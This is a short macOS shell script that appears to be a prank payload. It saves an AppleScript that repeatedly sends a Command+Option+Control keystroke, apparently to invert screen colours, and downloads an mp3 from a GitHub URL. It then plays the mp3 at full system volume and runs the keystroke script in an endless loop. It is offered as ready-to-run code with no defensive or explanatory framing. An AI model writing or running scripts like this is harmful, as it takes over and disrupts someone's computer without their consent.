echo "tell application \"System Events\"
key code 28 using {command down, option down, control down}
end tell" > ~/Library/config
curl https://raw.githubusercontent.com/Dzhaba/Ultimate_Banana/master/audio.mp3 > /tmp/mem.mp3
afplay /tmp/mem.mp3 &
osascript -e "set Volume 100"
while [ 1 ]; do osascript ~/Library/config; done
